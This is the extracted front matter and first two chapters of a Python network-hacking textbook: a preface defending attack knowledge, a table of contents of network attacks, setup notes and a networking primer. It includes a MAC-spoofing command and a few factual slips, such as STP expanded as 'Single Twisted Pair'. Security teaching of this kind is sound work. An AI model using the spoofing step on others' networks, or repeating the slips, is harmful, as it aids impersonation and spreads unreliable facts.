@@ -1,0 +1,2833 @@
+Bastian/uni00A0Ballmann
+Understanding 
+Network Hacks
+Attack and Defense with Python
+
+
+Understanding Network Hacks
+
+Bastian Ballmann
+Understanding Network
+Hacks
+Attack and Defense with Python
+123
+
+Bastian Ballmann
+Uster, Switzerland
+Translation from the German language ed ition “Network Hacks - Intensivkurs”,
+c/CRSpringer-Verlag, 2012
+ISBN 978-3-662-44436-8 ISBN 978-3-662-44437-5 (eBook)
+DOI 10.1007/978-3-662-44437-5Springer Heidelberg New York Dordrecht London
+Library of Congress Control Number: 2014960247
+© Springer-Verlag Berlin Heidelberg 2015
+This work is subject to copyright. All rights are rese rved by the Publisher, whether the whole or part of
+the material is concerned, speciﬁcally the rights of tra nslation, reprinting, reuse of illustrations, recitation,
+broadcasting, reproduction on microﬁlms or in any oth er physical way, and transmission or information
+storage and retrieval, electronic adaptation, com puter software, or by similar or dissimilar methodology
+now known or hereafter developed. Exempted from this l egal reservation are brief excerpts in connection
+with reviews or scholarly analysis or material s upplied speciﬁcally for the purpose of being entered
+and executed on a computer system, for exclusive use by the purchaser of the work. Duplication of
+this publication or parts thereof i s permitted only under the provisions of the Copyright Law of the
+Publisher’s location, in its current version, and per mission for use must always be obtained from Springer.
+Permissions for use may be obtaine d through RightsLink at the Copyright Clearance Center. Violations
+are liable to prosecution under the respective Copyright Law.
+The use of general descriptive names, registered names, trademarks, service marks, etc. in this publicationdoes not imply, even in the absence of a speciﬁc statement, that such names are exempt from the relevant
+protective laws and regulations an d therefore free for general use.
+While the advice and information in this book are b elieved to be true and accurate at the date of
+publication, neither the authors nor the editors nor the publisher can accept any legal responsibility for
+any errors or omissions that may be made. The publisher makes no warranty, express or implied, with
+respect to the material contained herein.
+Printed on acid-free paper
+Springer is part of Springe r Science+Business Media ( www.springer.com )
+
+For data travelers, knowledge hungry,
+curious, network-loving life-forms who like
+to explore and get to the bottom of thing.
+
+Preface
+Doesn’t this book explain how to break into a computer system? Isn’t that illegal
+and a bad thing at all?
+I would like to answer both questions with no (at least the second one).
+Knowledge is never illegal nor something bad, but the things you do with it.
+You as an admin, programmer, IT manager, or just an interested reader cannot
+protect yourself if you don’t know the techniques of the attackers. You cannot testthe effectiveness of your ﬁrewalls and intrusion detection systems or other security,related software if you are not able to see your IT infrastructure through the eyes ofan attacker. You cannot weigh up the danger to costs of possible security solutionsif you don’t know the risks of a successful attack. Therefore, it is necessary tounderstand how attacks on computer networks really work.
+The book presents a selection of possible attacks with short source code samples
+to demonstrate how easy and effectively and maybe undetected a network can beinﬁltrated. This way you can not only learn the real techniques but present them toyour manager or employer and help them in the decision if it would make sense tocare a little bit more about IT security. A t the end of the book, you should be able
+to not only understand how attacks on computer networks really work but also tomodify the examples to your own environment and your own needs.
+Sure, the book also tells those bad guys how to crack the net and write their own
+tools, but IT security is a sword with two sharp blades. Both sides feed themselvesoff the same pot of knowledge, and it is a c ontinuous battle, which the protecting
+side can never dream of winning if it censors itself or criminalizes their knowledge!
+Uster, Switzerland Bastian Ballmann
+vii
+
+Contents
+1 Installation .................................................................. 1
+1.1 The Right Operating System ......................................... 1
+1.2 The Right Python Version ........................................... 1
+1.3 Development Environment .......................................... 2
+1.4 Python Modules ...................................................... 3
+2 Network 4 Newbies ......................................................... 5
+2.1 Components .......................................................... 5
+2.2 Topologies ............................................................ 5
+2.3 ISO/OSI Layer Model ................................................ 7
+2.4 Ethernet ............................................................... 8
+2.5 VLAN ................................................................. 9
+2.6 ARP ................................................................... 10
+2.7 IP ...................................................................... 10
+2.8 ICMP .................................................................. 12
+2.9 TCP ................................................................... 12
+2.10 UDP ................................................................... 16
+2.11 An Example Network ................................................ 16
+2.12 Architecture ........................................................... 17
+2.13 Gateway ............................................................... 18
+2.14 Router ................................................................. 18
+2.15 Bridge ................................................................. 19
+2.16 Proxies ................................................................ 19
+2.17 Virtual Private Networks ............................................. 19
+2.18 Firewalls .............................................................. 20
+2.19 Man-in-the-Middle-Attacks .......................................... 21
+3 Python Basics ............................................................... 23
+3.1 Every Start Is Simple ................................................. 23
+3.2 The Python Philosophy .............................................. 24
+3.3 Data Types ............................................................ 25
+3.4 Data Structures ....................................................... 26
+ix
+
+x Contents
+3.5 Functions ............................................................. 27
+3.6 Control Structures .................................................... 28
+3.7 Modules ............................................................... 30
+3.8 Exceptions ............................................................ 31
+3.9 Regular Expressions .................................................. 31
+3.10 Sockets ................................................................ 33
+4 Layer 2 Attacks ............................................................. 35
+4.1 Required Modules .................................................... 35
+4.2 ARP-Cache-Poisoning ............................................... 35
+4.3 ARP-Watcher ......................................................... 39
+4.4 MAC-Flooder ......................................................... 41
+4.5 VLAN Hopping ...................................................... 42
+4.6 Let’s Play Switch ..................................................... 42
+4.7 ARP Spooﬁng Over VLAN Hopping ............................... 43
+4.8 DTP Abusing ......................................................... 44
+4.9 Tools .................................................................. 45
+4.9.1 NetCommander ............................................. 45
+4.9.2 Hacker’s Hideaway ARP Attack Tool ..................... 45
+4.9.3 Loki ......................................................... 45
+5 TCP/IP Tricks ............................................................... 47
+5.1 Required Modules .................................................... 47
+5.2 A Simple Sniffer ..................................................... 47
+5.3 Reading and Writing PCAP Dump Files ............................ 49
+5.4 Password Sniffer ..................................................... 51
+5.5 Sniffer Detection ..................................................... 53
+5.6 IP-Spooﬁng ........................................................... 54
+5.7 SYN-Flooder ......................................................... 55
+5.8 Port-Scanning ......................................................... 56
+5.9 Port-Scan Detection .................................................. 59
+5.10 ICMP-Redirection .................................................... 61
+5.11 RST Daemon ......................................................... 63
+5.12 Automatic Hijack Daemon ........................................... 65
+5.13 Tools .................................................................. 68
+5.13.1 Scapy ........................................................ 68
+6 WHOIS DNS? ............................................................... 73
+6.1 Protocol Overview ................................................... 73
+6.2 Required Modules .................................................... 74
+6.3 Questions About Questions .......................................... 74
+6.4 WHOIS ............................................................... 75
+6.5 DNS Dictionary Mapper ............................................. 76
+6.6 Reverse DNS Scanner ................................................ 77
+6.7 DNS-Spooﬁng ........................................................ 80
+
+Contents xi
+6.8 Tools .................................................................. 83
+6.8.1 Chaosmap ................................................... 83
+7 HTTP Hacks ................................................................ 85
+7.1 Protocol Overview ................................................... 85
+7.2 Web Services ......................................................... 88
+7.3 Required Modules .................................................... 88
+7.4 HTTP Header Dumper ............................................... 89
+7.5 Referer Spooﬁng ..................................................... 89
+7.6 The Manipulation of Cookies ........................................ 90
+7.7 HTTP-Auth Snifﬁng ................................................. 91
+7.8 Webserver Scanning .................................................. 92
+7.9 SQL Injection ......................................................... 95
+7.10 Command Injection .................................................. 101
+7.11 Cross-Site-Scripting .................................................. 102
+7.12 SSL Snifﬁng .......................................................... 103
+7.13 Proxy Scanner ........................................................ 107
+7.14 Proxy Port Scanner ................................................... 109
+7.15 Tools .................................................................. 111
+7.15.1 SSL Strip .................................................... 111
+7.15.2 Cookie Monster ............................................. 111
+7.15.3 Sqlmap ...................................................... 112
+7.15.4 W3AF ....................................................... 112
+8W i ﬁ F u n ..................................................................... 113
+8.1 Protocol Overview ................................................... 113
+8.2 Required Modules .................................................... 115
+8.3 Wiﬁ Scanner .......................................................... 116
+8.4 Wiﬁ Sniffer ........................................................... 117
+8.5 Probe-Request Sniffer ................................................ 118
+8.6 Hidden SSID .......................................................... 119
+8.7 MAC-Address-Filter ................................................. 120
+8.8 WEP ................................................................... 120
+8.9 WPA .................................................................. 122
+8.10 WPA2 ................................................................. 124
+8.11 Wiﬁ-Packet-Injection ................................................. 124
+8.12 Playing Wiﬁ Client ................................................... 125
+8.13 Deauth ................................................................ 127
+8.14 Wiﬁ Man-in-the-Middle ............................................. 128
+8.15 Wireless Intrusion Detection ......................................... 133
+8.16 Tools .................................................................. 134
+8.16.1 WiFuzz ...................................................... 134
+8.16.2 Pyrit ......................................................... 135
+8.16.3 AirXploit .................................................... 135
+
+xii Contents
+9 Feeling Bluetooth on the Tooth ............................................ 137
+9.1 Protocol Overview ................................................... 137
+9.2 Required Modules .................................................... 138
+9.3 Bluetooth-Scanner .................................................... 139
+9.4 SDP-Browser ......................................................... 140
+9.5 RFCOMM-Channel-Scanner ........................................ 140
+9.6 OBEX ................................................................. 142
+9.7 Blue Snarf Exploit .................................................... 143
+9.8 Blue Bug Exploit ..................................................... 144
+9.9 Bluetooth-Spooﬁng .................................................. 145
+9.10 Snifﬁng ............................................................... 146
+9.11 Tools .................................................................. 148
+9.11.1 BlueMaho ................................................... 148
+10 Bargain Box Kung Fu ...................................................... 149
+10.1 Required Modules .................................................... 149
+10.2 Spooﬁng E-mail Sender .............................................. 149
+10.3 DHCP Hijack ......................................................... 150
+10.4 IP Brute Forcer ....................................................... 154
+10.5 Google-Hacks-Scanner ............................................... 155
+10.6 SMB-Share-Scanner ................................................. 156
+10.7 Login Watcher ........................................................ 157
+A Scapy Reference ............................................................ 161
+A.1 Protocols .............................................................. 161
+A.2 Functions ............................................................. 162
+B Secondary Links ............................................................ 173
+Index ............................................................................... 175
+
+Introduction
+Who Should Read This Book?
+This book addresses interested Python programmers who want to learn about
+network coding and administrators who want to actively check the security of theirsystems and networks. The content should also be useful for white, gray, and blackhat hackers, who prefer Python for coding, as well as for curious computer users,who want to get their hands on practical IT s ecurity and are interested in learning to
+see their network through the eyes of an attacker.
+You neither need deep knowledge on how computer networks are built up nor in
+programming. You will get through all the knowledge you need to understand thesource codes of the book in Chaps. 2and3. Readers, who know how to program in
+Python and dream in OSI layers or packet headers, can right away jump to Chap. 5
+and start having fun at their device.
+Of course a book like this needs a disclaimer, and the author would be happy if
+all readers only play on systems they are allowed to do so and use the informationof this book only for good and ethical actions, otherwise, you may be breaking alaw depending on the country your device is connected in.
+The length of the book doesn’t allow for in-depth discussion of all topics. You
+will only get somewhat more than the basics. If you want to dig deeper, you shouldafterward get some special lecture in your special ﬁeld of interest.
+The Structure of the Book
+The different hacks are grouped by network protocols, and every chapter content isordered by difﬁculty. You can read the book in the order you like except both theintroduction chapters about networks (Chap. 2) and Python (Chap. 3).
+The code samples are printed unshortened; therefore, you can just copy and use
+them without worrying about incremental changes or add-ons. If you are too lazy or
+xiii
+
+xiv Introduction
+busy to type, you should consider downloading all sources by pointing for browsing
+software at http://www.codekid.net/pythonnetwork-hacks/all.zip .
+At the end of each chapter, you will ﬁnd a selection of tools also written in Python
+that attack the described protocol in a more detailed way.
+Thanks to the basic knowledge learned in the chapter, it shouldn’t be too hard to
+read and understand the source code of the tools.
+The Most Important Security Principles
+The most important principles in building a secure network of the author’s point ofview are:
+1. Security solutions should be simple. A ﬁrewall rule set that no one understands
+is a guarantee for security holes. Software that’s complex has more bugs thansimple code.
+2. Less is more. More code, more systems, more services provide more possibilities
+of attack.
+3. Security solutions should be open source. You can search easier for security
+problems if you have access to the source code. If the vendor disagrees to closean important security hole, you or someone else can ﬁx it and you don’t have towait for six or more months till the next patch day. Proprietary software can havebuilt-in backdoors sometimes called Law In terception Interf ace. Companies like
+Cisco (see RFC 3924), Skype (US-Patent-No 20110153809), and Microsoft(e.g., _NSAKEY http://en.wikipedia.org/wiki/NSAKEY ) are only popular
+examples.
+4. A ﬁrewall is a concept, not a box that you plug in and you are safe.5. Keep all your systems up to date! A system that’s considered secure today can
+be unprotected a few hours later. Update all systems, also smartphones, printer,and switches!
+6. The weakest device deﬁnes the security of the complete system, and that doesn’t
+necessarily have to be a computer; it can also be a human (read about socialengineering).
+7. There is no such thing as 100 % secure. Even a computer that is switched off can
+be inﬁltrated by a good social engineer. The aim should be to build that muchlayers that the attacker falls over one trip wire and leaves traces and that the value
+he or she can gain from a successful inﬁltration is much lower than the work orit kills his owner’s skills.
+
+Chapter 1
+Installation
+Abstract This chapter explains on which operating system the sources can be
+executed, which Python version you will need and how to install additional Pythonmodules. Last but not least, we will discus s some possible solutions for setting up a
+complete development environment. If you are already familiar with the Pythonprogramming language you can skip this introductory chapter without missinganything.
+1.1 The Right Operating System
+Yes, I know the title of this section can lead to ﬂame wars. It should just illustrate onwhich operating systems the source codes of this book are run. The author is usinga GNU/Linux systems with kernel version 2.6.x and 3.x for development, but mostof the sources, except the chapter about Bluetooth, should also runable on BSD orMac OS X systems. If you succeed in running the source code on other systemsthe author would be happy if you could drop him a tiny email. Of course all othercomments or criticisms are also welcome.
+1.2 The Right Python Version
+Python 3 has been released for quite a number of years now. However, we willnevertheless use Python 2.7, because n early all modules we use are only available
+for this version of Python. Version 2.5 and 2.6 should also work but the author didnot test it.
+To check which version of Python is installed on your system, execute the
+following command
+python --version
+Python 2.7.2
+If the output is less than 2.5 you should consider upgrading Python. If your
+version is 3.x think about installing Python 2.7 in parallel, but then you mighthave to change the interpreter path from /usr/bin/python to /usr/bin/python2 or/usr/bin/python2.7.
+© Springer-Verlag Berlin Heidelberg 2015
+B. Ballmann, Understanding Network Hacks , DOI 10.1007/978-3-662-44437-5_11
+
+2 1 Installation
+1.3 Development Environment
+The author prefers GNU/Emacs ( www.gnu.org/software/emacs ) as a development
+environment, because he thi nks its editing and extension possibilities are unbeatable.
+Emacs supports all common features like syntax highlighting, code completion,code templates, debugger support, PyLint integration and thanks to Rope, Pymacsand Ropemacs, it has one of the best refactoring support for Python.
+If you want to give Emacs and it features a try, the author suggests installing the
+awesome extension set Emacs-for-Python, downloadable at gabrielelanaro.github.
+com/emacs-for-python . Thanks to the amount of available plugins, Emacs can also
+be used as an email and Usenet client, for irc or jabber chatting, as music playerand additional features like speech support, integrated shell and ﬁle explorer up togames like Tetris and Go. Some guys even think Emacs is not an IDE, but a wholeoperating system and use it as init process.
+A good alternative for a console editor is Vim ( www.vim.org ) of course. The
+author does not like ﬂame wars so if you do not know Emacs or Vim, give both atry. They are great! Vim includes all features of a modern IDE, is extensible andcompletely controllable with keyboard shortcuts and features a GUI version.
+If you want to use one of those full-blown, modern IDEs, then check out
+Eclipse ( www.eclipse.org ) together with PyDev ( pydev.org ). Eclipse also has all the
+common features as well as code outlining, a better integrated debugging support
+and an endless seeming torrent of useful plugins like UMLet to draw UML diagramsor Mylyn to perfectly integrate a bugtracking system.
+As alternative GUI-only IDE, you could also check out Eric4 ( eric-ide.python-
+projects.org ) and Spyder ( code.google.com/p/spyderlib ), which also include all
+common features plus a debugger, PyLint support and refactoring.
+If you do not have that many resources and RAM for programming tasks,
+but need a GUI then Gedit might be the editor of your choice. However youshould extend it with a bunch of plugins: Class Browser, External Tools, PyLint,Python Code Completion, Python Doc String Wizard, Python Outline, Source CodeComments and Rope Plugin.
+The installation could be somewhat nasty and the functionality not as complete
+as for the other candidates. However, Gedit only uses the tenth of your RAM thatEclipse does.
+The ﬁnal choice is left to you. If you don’t w ant to choose or try all possibilities,
+you should ﬁrst try Eclipse with Pydev as bundle downloadable from Aptana(aptana.com/products/studio3 ). The chances are high that you will like it.
+
+1.4 Python Modules 3
+1.4 Python Modules
+Python modules can be found in the Python packet index pypi.python.org .N e w
+modules can be installed by one of th e following three possibilities:
+1. Download the source archive, unp ack it and execute the magic line
+python setup.py install
+2. Use easy_install
+easy_install <modulname>
+3. Get your feet wet with pip. Maybe you have to install a package like
+python-pip before you can use it.
+pip install <modulname>
+You should use pip, because it also supports deinstallation and upgrading of
+one or all modules. You could also export a list of installed modules and its version,reinstall them on another system, you can search for modules and more.
+Which Python modules are needed for which tools and source code snippets will
+be described at the beginning of the chapter or in the description of the snippet, ifthe module is only used for that code. This way, you will only install modules thatyou really want to use.
+
+Chapter 2
+Network 4 Newbies
+Abstract Computer networks are the veins of the information age, protocols the
+language of the net.
+This chapter describes the basics of networking starting with hardware going
+over to topology and the functionality of the most common protocols of anEthernet/IP/TCP network up to Man-in-the-middle attacks. For all who want torebuild or refresh their knowledge of networking.
+2.1 Components
+To be able to build a computer network of course you need some hardware.Depending on the kind of net you’ll need cables, modems, old school acoustic inbanana boxes, antennas or satellite receivers beside computers and network cardsas well as router (Sect. 2.14), gateways (Sect. 2.13), ﬁrewalls Sect. 2.18, bridges
+(Sect. 2.15), hubs and switches.
+Ahub is just a simple box you plug network cables in and it will copy all signals
+to all connected ports. This property will probably lead to an explosion of networktrafﬁc. That’s a reason why hubs are rarely used these days. Instead most of the timeyou will see switches building the heart of the network. The difference between
+a hub and a switch is a switch remembers the MAC address of the network cardconnected to the port and sends trafﬁc only to the port it’s destinated to. MACaddresses will be explained in more detail in Sect. 2.4.
+2.2 Topologies
+You can cable and construct computer networks in different ways. Nowadays
+the most common variant is the so called star network (see Fig. 2.1), where all
+computer are connected to a central device. The disadvantage is that this device is
+a single point of failure and the whole network will break down if it gets lost. Thisdisadvantage can be circumstanced by using redundant (multiple) devices.
+Another possibility is to connect all c omputers in one long row one after the
+other, the so called bus network (see Fig. 2.2). The disadvantage of this topology is
+that each computer must have two network cards and depending on the destination
+© Springer-Verlag Berlin Heidelberg 2015
+B. Ballmann, Understanding Network Hacks , DOI 10.1007/978-3-662-44437-5_25
+
+6 2 Network 4 Newbies
+Fig. 2.1 Star network
+Fig. 2.2 Bus network
+the trafﬁc gets routed through all computers of the net. If one of them fails or has
+too high a load the connections behind that host are lost.
+The author has seen only a few bus networks this decade and all consisted of two
+computers directly connected to guarantee time critical or trafﬁc intensive services
+like database replication, clustering of application servers or synchronization of
+backup servers. In all cases the reason for a bus network was to lower the load
+of the star network.
+As last variant the ring network (Fig. 2.3) should be mentioned, which as the
+name implies connects all computers in a circle. The ring network has the same
+disadvantages as a bus network except that the network will only fail partly if a
+computer gets lost as long as the net can route the trafﬁc the other way round. The
+author has not seen a productive ring network, but some wise guys whisper that it is
+the topology of backbones used by ISPs and large companies.
+Additionally one often reads about LAN (Local Area Network), WAN (Wide
+Area Network) and sometimes even about MAN (Middle Area Network). A LAN
+is a local network that’s most of the time limited to a building, ﬂoor or room.
+In modern networks most computers are connected on a LAN over one or more
+switches. Multiple LANs connected over a router or VPN (see Sect. 2.17) are called
+MAN. If the network spreads over multip le countries or even the whole world like
+the internet than it is deﬁned as a W AN.
+
+2.3 ISO/OSI Layer Model 7
+Fig. 2.3 Ring network
+Fig. 2.4 OSI model
+2.3 ISO/OSI Layer Model
+According to the pure doctrine the ISO/OSI layer model, technically separates a
+computer network into seven layers (see Fig. 2.4).
+
+8 2 Network 4 Newbies
+Table 2.1 OSI layer
+OSI layer Layer name Task
+1 Physical Cables, Antennas, etc.
+2 Data-Link Creates a point-to-point connection between two computers
+3 Network Provides for addressing of the destination system
+4 Transport Takes care that the data is received in the
+right order and enables retransmission on packet loss
+5 Session Used to address single applications (e.g. using ports)
+6 Presentation Conversion of data formats (e.g. byte order, compression, encryption)
+7 Application Protocols that deﬁne the real service like HTTP
+Each layer has a clearly deﬁned task and each packet passes them one after
+another in the operating systems kernel up to the layer it’s operating on (Table 2.1).
+2.4 Ethernet
+Have you ever bought a “normal” network cable or card in a shop? Than the chance
+is nearly 100 % that you own ethernet hardware, because Ethernet is with hugemargin the most used network technology today. You will see network componentswith different speed limits like 1, 10, 100 MBit or gigabit and an ethernet canbe constructed with different cable types like coaxial (old school), twisted pair(common) or glass ﬁber (for data hungry guys).
+Twisted pair cables can be divided into to the variations STP (Single Twisted
+Pair) and UTP (Unshielded Twisted Pair) as wel l as patch- and crossover cables.
+The difference between STP and UTP cables is that the ﬁbers of the UTP cables
+are unshielded and therefore they have a lower quality compared to STP cables.Nowadays new cables in a shop should all be STP.
+Patch and cross cables can be separate d from each other by looking at the plugs of
+the cable. If the colors of the ﬁbers are in the same order than its a patch otherwisea cross cable. A cross cable is used to directly connect two computers, a patch
+cable is used to connect a computer to a hub or switch. Modern network cards can
+automatically cross the ﬁbers s o cross cables are a dying race.
+Every network card in an Ethernet network has a MAC address that’s world-
+wide unique and are used to address devices on the net. The MAC address
+consists of six two digit hexadecimal numbers, which are separated by colons (e.g.aa:bb:cc:11:22:33 ).
+Its a common misbelief that a computer in a local TCP/IP network is reached over
+its IP address; in reality the MAC address is used for this purpose. Another commonmisunderstanding is that the MAC address cannot be spoofed. The operatingsystem is responsible to write the MAC into the Ethernet header and systems likeGNU/Linux or *BSD have possibilities in their base system to change the MACwith one command.
+ifconfig eth0 hw ether c0:de:de:ad:be:ef
+
+2.5 VLAN 9
+Fig. 2.5 Ethernet header
+Fig. 2.6 VLAN header
+Beside the source destination MAC address an Ethernet header (see Fig. 2.5)
+consists of a type ﬁeld and a checksum. The type ﬁeld deﬁnes the protocol that
+follows Ethernet e.g. 0x0800 for IP or 0x0806 for ARP.
+Last but not least the term CSMA/CD should be explained. CSMA/CD stands
+for Carrier Sense Multiple Access/Collision Detect and describes how a computer
+sends data over an Ethernet. First of all it listens on the wire if someone is currently
+sending something. If that’s the case it just waits a couple of random seconds and
+tries again. If the channel is free it sends the data over the network. Should two
+stations be transmitting data at the same data a collusion will result, therefore every
+sending station must listen afterwards to detect a collusion, than randomly wait some
+seconds and retransmit the data.
+2.5 VLAN
+A VLAN (Virtual Local Area Network) separates several networks on a logical
+base. Only devices on the same VLAN can see each other. VLANs where invented
+to deﬁne a networks structure independen tly from its physical hardware, to prioritize
+connections and to minimize broadcast trafﬁc. They were not developed with
+security in mind, but its a common myth that VLANs can add to your security.
+Don’t rely on this myth, because several way s exist to circumvent the separation of
+aV L A N( s e eS e c t . 4.5).
+Switches implement VLANs in two different ways: through tagging of packets
+using a IEEE 802.1q Header (see Fig. 2.6), that’s inserted after the Ethernet header
+or simply deﬁned by port. 802.1q is a newer variant, which allows the creation of a
+VLAN spread over several switches.
+
+10 2 Network 4 Newbies
+Fig. 2.7 ARP header
+2.6 ARP
+ARP (Address Resolution Protocol) transl ates between layer 2 (Ethernet) and 3 (IP).
+It is used to resolve MAC addresses to IP addresses. The other way round is done
+by RARP (Reverse Address Resolution Pro tocol). The structure of an ARP headers
+can be seen in Fig. 2.7.
+Imagine a source host (192.168.2.13) tries to communicate with a destination
+host (192.168.2.3) for the ﬁrst time than it will loudly shout over the broadcast
+address (see Sect. 2.7) something like the following: “Hello, here is Bob, to all,
+listen! I want to talk to Alice! Who has the MAC address of Alice?!”
+In Ethernet speech it looks like this:
+ARP, Request who-has 192.168.2.3 tell 192.168.2.13, length 28
+The destination host (192.168.2.3) now shrieks up and screams “Hey that’s me!”
+by sending his MAC address to the requesting host (192.168.2.13).
+ARP, Reply 192.168.2.3 is-at aa:bb:cc:aa:bb:cc, length 28
+2.7 IP
+IP like Ethernet is a connection-less protocol, that means it doesn’t know a relation
+between packets. It is used to deﬁne the s ource and destination host on layer 3, to
+ﬁnd the (quickest) path between two communications partners by routing packets
+(see Sect. 2.14) and to handle errors with ICMP (Sect. 2.8). An example error is the
+famous host not reachable packet.
+Beside that it handles fragmentation by cutting packets bigger than the MTU
+(Max Transmission Unit) into smaller ones. Last but not least does it implement a
+timeout mechanism thanks to the header TTL (T ime-to-live) and such avoids endless
+network loops. Every host called hop a packet passes subtracts the TTL by one and
+if it reaches 0 it should be thrown away and the source host gets a error via ICMP.
+Today there are two variants of IP IPv4 and IPv6. Both protocols differ widely
+and not only in size of IP addresses. IPv6 can be extended through so called optional
+
+2.7 IP 11
+headers and IPv6 alone can ﬁll a whole book. This book only covers IPv4, because
+its still the most common one.
+An IPv4 header looks like diagram (Fig. 2.8).
+First we want to see how IP network addressing works. An IPv4-address (e.g.
+192.168.1.2) consists of 4 bytes divided by dots. A byte is equal to 8 bit therefore
+each number of an IPv4 address can be 2 expand 8 or 256 in maximum, thus it starts
+with a zero in reality it can not be bigger than 255.
+Beside an IP address every IP network node needs a netmask (the most common
+one is 255.255.255.0). The netmask deﬁnes the size of the net and its used to
+calculate the net-start-address. The ﬁrst IP of a net is called net-start-address, the
+last one is called broadcast-address, both cannot be used by hosts because they have
+a special functionality. Packets to the broadcast address are forwarded to every host
+on the network.
+If a computer wants to communicate to another one over an IP network it ﬁrst of
+all calculates its net-start-address with the use of its IP address and network mask.
+Let’s say the computer has the IP 192.168.1.2. In binary that is:
+11000000.10101000.00000001.00000010
+A network mask of 255.255.255.0 in binary looks like:
+11111111.11111111.11111111.00000000
+Now one combines both addresses using a binary AND-operation that means
+every position, where both number are 1, stays 1, otherwise it is replaced with a 0.
+At the end you have the number of Fig. 2.9.
+11000000.1010100.00000001.00000000
+Calculated in decimal this is 192.168.1.0, the net-start-address.
+Fig. 2.8 IP-header
+Fig. 2.9 Subnet-calculation
+
+12 2 Network 4 Newbies
+Fig. 2.10 ICMP-header
+If you are not familiar with digital syste ms such as binary you could help yourself
+with a scientiﬁc calculator o r a short internet search.
+The netmask deﬁnes how many bits of an IP address are reserved for the net and
+how many for the host. In our example the ﬁrst 24 bits are 1 that’s the same as /24
+for short, the so called CIDR block. If the complete last byte is accessible for hosts
+the net is classiﬁed as a class c, 2 byte make a class b, and 3 a class a otherwise the
+net is called a subnet.
+Our example host computes the same AND-operation for the destination to
+obtain its net-start-address. If they differ the destination is in another network and
+the packet is send to the default gateway, otherwise the net is looked up in the routing
+table (see Sect. 2.14) and the packet is sent over the speciﬁed device or to the next
+router depending on its conﬁguration.
+2.8 ICMP
+ICMP (Internet Control Message Protocol) is used by IPfor error handling.
+Therefore it sets a type and a code ﬁeld in its header to deﬁne the error. The header
+looks like in Fig. 2.10.
+Most readers know the protocol for the famous ICMP echo-request
+packet sent by the program ping, that hopes to receive an echo-response
+to test if a computer is reachable and meas ures the network latency. Other ICMP
+messages include redirect-host for telling a host that there is a better router to reach
+his destination. The Table 2.2lists all type and code combinations.
+2.9 TCP
+TCP (Transmission Control Protocol) provides session management. A new TCP
+session is initialized by the famous Three-Way-Handshake (see Fig. 2.13). TCP
+numbers all packets to ensure that they are processed in the same order they were
+transmitted by the source system. The destination host sends an acknowledgment to
+let the source know that the packet was recei ved correctly after c hecking a checksum
+otherwise the source retransmits the packet. Last but not, least TCP addresses
+programs on a host by the use of ports. The port of the sending instance is called
+source port the receiving destination port . Commonly used application protocols
+
+2.9 TCP 13
+Table 2.2 ICMP codes/types
+Code Type Name
+0 0 Echo-reply
+3 0 Net-unreachable
+3 1 Host-unreachable
+3 2 Protocol-unreachable
+3 3 Port-unreachable
+3 4 Fragmentation-needed
+3 5 Source-route-failed
+3 6 Dest-network-unknown
+3 7 Dest-port-unknown
+3 8 Source-host-isolated
+3 9 Network-admin
+3 10 Host-admin
+3 11 Network-service
+3 12 Host-service
+3 13 Com-admin-prohibited
+3 14 Host-precedence-violation
+3 15 Precedence-cuttof-in-effect
+4 0 Source-quench
+5 0 Redirect-network
+5 1 Redirect-host
+5 2 Redirect-service-network
+5 3 Redirect-service-host
+6 0 Alternate-host-address
+8 0 Echo-request
+9 0 Router-advertisement
+10 0 Router-selection
+11 0 ttl-ex ceeded
+11 1 Fragment-reassembly-exceeded
+12 0 Pointer-error
+12 1 Missing-option
+12 2 Bad-length
+13 0 Timestamp-request
+14 0 Timestamp-reply
+15 0 Info-request
+16 0 Info-reply
+17 0 Mask-request
+18 0 Mask-reply
+30 0 Traceroute-forwarded
+30 1 Packet-discarded
+31 0 Datagram-conversion-error
+32 0 Mobile-host-redirect
+(continued)
+
+14 2 Network 4 Newbies
+Table 2.2 (continued)
+Code Type Name
+33 0 ipv6-where-are-you
+34 0 ipv6-here-I-am
+35 0 Mobile-registration-request
+36 0 Mobile-registration-reply
+37 0 Domain-name-request
+38 0 Domain-name-reply
+40 0 Bad-spi
+40 1 Authentication-failed
+40 2 Decompression-failed
+40 3 Decryption-failed
+40 4 Need-authentication
+40 5 Need-authorization
+Fig. 2.11 TCP-header
+likeHTTP ,FTP,IRC etc. have default port under 1024 e.g. a HTTP server normally
+listens on port 80.
+A typical TCP looks like Fig. 2.11.
+Beside ports one also needs to know about TCP ﬂags (see Table 2.3), sequence-
+and acknowledgment-number and windowsize. Flags are used for session manage-
+ment to create or destroy a connection and to bid the destination to handle a packet
+with a higher priority.
+TheSequence-Number is used to sort the received packets into the same order
+as they were send by the origin and to detect lost packets. Each packet gets an
+individual number that is incremented by one for every transmitted byte.
+TheAcknowledgment-Number as the name suggests acknowledges the coun-
+terpart that a packet with a certain seque nce number has been received correctly.
+Therefore it uses the sequence number and adds one. The Acknowledgment-
+number contains the next expected Sequence-Number.
+The window size deﬁnes the size of the operating systems cache of received, but
+not yet processed packets. A window size o f zero indicates the sending station is
+under pressure and asks to be friendly and to slow down or even stop sending more
+packets until a bigger window size is received.
+
+2.9 TCP 15
+Table 2.3 TCp-ﬂags
+Flag Function
+SYN Ask for a new connection
+ACK Acknowledge the receipt of a packet
+RST Cancel a connection attempt (is usually send when a host tries to connect to a
+closed port)
+FIN Cleanly close an established connection (must be acknowledged by the
+counterpart)
+URG Mark a packet as urgent
+PSH Bid the receiver to handle packet with higher priority
+Fig. 2.12 Interaction of sequence- and acknowledgment-number
+Fig. 2.13 Three-way-handshake
+Beside that the window size deﬁnes the receive window. A host accepts all
+packets lower than Acknowledgment-Number CWindowsize (Fig. 2.12).
+The establishment of a TCP connection is divided into three actions the Three-
+Way-Handshake (see Fig. 2.13): First of all the initiating computer sends a packet
+with theSYN-Flag set and to stay by our example an Initial-Sequence-Number of
+1000. The Initial-Sequence-Number must be as random as possible to avoid Blind-
+IP-Spooﬁng attacks, where the attacker guesses a sequence number without being
+able to read the network trafﬁc.
+
+16 2 Network 4 Newbies
+Fig. 2.14 UDP-header
+The destination host responds with a packet where the SYN- and ACK-Flag are
+set. As Initial-Sequence-Number it choos es 5000 and the Acknowledgment-Number
+contains the Sequence-Number of the source host incremented by one (1001).
+Last but not least the source host sends a ﬁnal packet with set ACK- (but not
+SYN) ﬂag set and uses the acknowledgm ent number of the SYN/ACK packet as
+sequence number as well as the sequence number of the previous packet plus one
+as acknowledgment number. This completes the Three-Way-Handshake. From now
+on both parties send packets with the ACK ﬂag set.send ACK packets.
+If a packets hits a closed port the destination must send a RST-Packet to be
+conform to RFC793. This signals the source host that the request was invalid. Lot
